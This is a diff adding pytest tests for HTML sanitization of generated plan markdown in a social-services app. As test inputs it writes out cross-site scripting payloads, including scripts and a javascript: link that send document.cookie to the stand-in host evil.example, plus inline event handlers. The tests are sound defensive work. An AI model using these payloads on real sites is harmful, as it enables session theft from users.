@@ -3,6 +3,7 @@ from unittest.mock import MagicMock
 from uuid import uuid4
 
 import pytest
+from html_sanitizer import Sanitizer
 
 from app.core.db import AsyncSession
 from app.models.models import (
@@ -11,6 +12,7 @@ from app.models.models import (
     PlanGeneration,
     PlanGenerationResourceAssociation,
     ResourceAssociationAction,
+    sanitize_markdown,
 )
 
 
@@ -206,3 +208,218 @@ def test_active_resource_associations_empty_ledger():
     gen = _gen_with_events([])
 
     assert _call_property(gen) == []
+
+
+# ---------------------------------------------------------------------------
+# PlanGeneration.markdown_result sanitization
+# ---------------------------------------------------------------------------
+
+
+async def _gen_markdown(async_session, markdown: str | None) -> str | None:
+    new_plan = Plan(client_pseudo_id="client_1")
+    async_session.add(new_plan)
+    await async_session.commit()
+    """Validate markdown through PlanGenerationBase so pydantic validators run."""
+    return PlanGeneration(markdown_result=markdown, plan_id=new_plan.id).markdown_result
+
+
+@pytest.mark.asyncio
+async def test_sanitize_markdown_none_is_unchanged(async_session):
+    assert await _gen_markdown(async_session, None) is None
+
+
+@pytest.mark.asyncio
+async def test_sanitize_markdown_plain_markdown_is_unchanged(async_session):
+    text = (
+        "## Housing Resources\n\n"
+        "Here are some options to consider:\n\n"
+        "- **Shelter First** – emergency housing assistance\n"
+        "- *Community Housing* – long-term support program\n\n"
+        "Contact your **case manager** for more details."
+    )
+    assert await _gen_markdown(async_session, text) == text
+
+
+@pytest.mark.asyncio
+async def test_sanitize_markdown_allowed_tags_wrap_markdown_content(async_session):
+    # Structural tags wrap markdown lists and prose in real plan output
+    markdown = (
+        "## Employment\n\n"
+        "<resources>\n"
+        "- Job Training Center: Mon–Fri 9am–5pm\n"
+        "- Resume Workshop: every Tuesday\n"
+        "</resources>\n\n"
+        "<note>Bring **photo ID** and work history documentation.</note>\n\n"
+        "<annotations><annotation>Last reviewed: January 2024</annotation></annotations>"
+    )
+    result = await _gen_markdown(async_session, markdown)
+    for tag in ("note", "resources", "annotation", "annotations"):
+        assert f"<{tag}>" in result
+        assert f"</{tag}>" in result
+    assert "Job Training Center" in result
+    assert "photo ID" in result
+
+
+@pytest.mark.asyncio
+async def test_sanitize_markdown_disallowed_html_stripped_from_markdown(async_session):
+    # An attacker (or buggy LLM) injecting <div>/<p> into otherwise valid markdown
+    markdown = (
+        "## Support Services\n\n"
+        "<div>Contact your local office for assistance.</div>\n\n"
+        "<p>Additional resources are available online.</p>"
+    )
+    result = await _gen_markdown(async_session, markdown)
+    assert "<div>" not in result
+    assert "<p>" not in result
+    assert "Contact your local office" in result
+    assert "Additional resources" in result
+
+
+@pytest.mark.asyncio
+async def test_sanitize_markdown_script_tag_is_removed(async_session):
+    # Script injected between markdown sections
+    markdown = (
+        "## Benefits\n\n"
+        "<script>fetch('https://evil.example/steal?c='+document.cookie)</script>\n\n"
+        "- **SNAP** – food assistance program\n"
+        "- Medicaid – health coverage"
+    )
+    result = await _gen_markdown(async_session, markdown)
+    assert "<script>" not in result
+    assert "fetch(" not in result
+    assert "SNAP" in result
+    assert "Medicaid" in result
+
+
+@pytest.mark.asyncio
+async def test_sanitize_markdown_inline_event_handler_is_stripped(async_session):
+    # Event handler on an otherwise-allowed structural tag
+    result = await _gen_markdown(
+        async_session,
+        '<note onmouseover="stealData()">Call ahead to confirm availability.</note>',
+    )
+    assert "onmouseover" not in result
+    assert "<note>" in result
+    assert "Call ahead to confirm availability." in result
+
+
+@pytest.mark.asyncio
+async def test_sanitize_markdown_javascript_url_is_stripped(async_session):
+    # JS URL smuggled inside a resources block
+    markdown = (
+        "<resources>\n"
+        "<a href=\"javascript:void(document.location='https://evil.example/'+document.cookie)\">"
+        "Apply here</a>\n"
+        "</resources>"
+    )
+    result = await _gen_markdown(async_session, markdown)
+    assert "javascript:" not in result
+    assert "<resources>" in result
+
+
+@pytest.mark.asyncio
+async def test_sanitize_markdown_style_tag_is_removed(async_session):
+    # Style tag injected before a markdown section heading
+    markdown = (
+        "<style>body { display: none !important; }</style>\n\n"
+        "## Reentry Resources\n\n"
+        "The following services are available in your area."
+    )
+    result = await _gen_markdown(async_session, markdown)
+    assert "<style>" not in result
+    assert "display: none" not in result
+    assert "Reentry Resources" in result
+    assert "services are available" in result
+
+
+@pytest.mark.asyncio
+async def test_sanitize_markdown_nested_disallowed_inside_allowed_tag(async_session):
+    # Script nested inside a <note> — tag must survive but inner script must not
+    markdown = (
+        "<note>"
+        "<script>exfil(document.cookie)</script>"
+        "**Important:** verify eligibility before applying."
+        "</note>"
+    )
+    result = await _gen_markdown(async_session, markdown)
+    assert "<script>" not in result
+    assert "exfil(" not in result
+    assert "<note>" in result
+    assert "verify eligibility" in result
+
+
+def test_html_sanitizer_allowed_tags_behaviour():
+    """Verify html-sanitizer preserves all five structural tags including annotation.
+
+    Unlike nh3 (which treats <annotation> as a MathML element and strips it),
+    html-sanitizer uses lxml and treats all listed tags as plain HTML elements.
+    """
+    allowed = {"note", "notes", "resources", "annotation", "annotations"}
+    sanitizer = Sanitizer(
+        {"tags": allowed, "attributes": {}, "empty": set(), "separate": set()}
+    )
+    html = (
+        "<note>Call ahead to confirm hours.</note>"
+        "<notes>Multiple locations available.</notes>"
+        "<resources>- Downtown Office\n- Eastside Center</resources>"
+        "<annotations><annotation>Last reviewed: 2024-01-15</annotation></annotations>"
+    )
+    result = sanitizer.sanitize(html)
+
+    for tag in allowed:
+        assert f"<{tag}>" in result, f"expected <{tag}> to be preserved"
+        assert f"</{tag}>" in result
+
+
+def test_sanitize_markdown_utility_strips_threats_in_plan_context():
+    """Direct test of sanitize_markdown: threats embedded in realistic plan output."""
+    plan_with_threats = (
+        "## Housing\n\n"
+        "<script>navigator.sendBeacon('https://evil.example/', document.cookie)</script>\n\n"
+        '<div onclick="stealData()">Temporary shelter options:</div>\n\n'
+        "<resources>\n"
+        "- Shelter A – 24/7 intake\n"
+        '<a href="javascript:void(0)">Apply online</a>\n'
+        "</resources>\n\n"
+        "<note>**Bring ID** to all appointments.</note>"
+    )
+    result = sanitize_markdown(plan_with_threats)
+    assert "<script>" not in result
+    assert "sendBeacon" not in result
+    assert "<div>" not in result
+    assert "onclick" not in result
+    assert "javascript:" not in result
+    # Safe content preserved
+    assert "Shelter A" in result
+    assert "<resources>" in result
+    assert "<note>" in result
+    assert "Bring ID" in result
+
+
+@pytest.mark.asyncio
+async def test_plan_generation_sanitizes_markdown_on_create(async_session):
+    """Integration: PlanGeneration persists sanitized markdown in a realistic plan."""
+    plan = Plan(client_pseudo_id="sanitize_integration")
+    async_session.add(plan)
+    await async_session.commit()
+
+    raw_markdown = (
+        "## Employment\n\n"
+        "<script>xss()</script>\n\n"
+        "<resources>\n"
+        "- **Job Training Center** – Mon–Fri 9am–5pm\n"
+        "- Resume Workshop – every Tuesday\n"
+        "</resources>\n\n"
+        "<note>Bring your **résumé** and two references.</note>"
+    )
+    gen = PlanGeneration(plan_id=plan.id, markdown_result=raw_markdown)
+    async_session.add(gen)
+    await async_session.commit()
+    await async_session.refresh(gen)
+
+    assert "<script>" not in gen.markdown_result
+    assert "xss()" not in gen.markdown_result
+    assert "<resources>" in gen.markdown_result
+    assert "Job Training Center" in gen.markdown_result
+    assert "<note>" in gen.markdown_result
+    assert "résumé" in gen.markdown_result
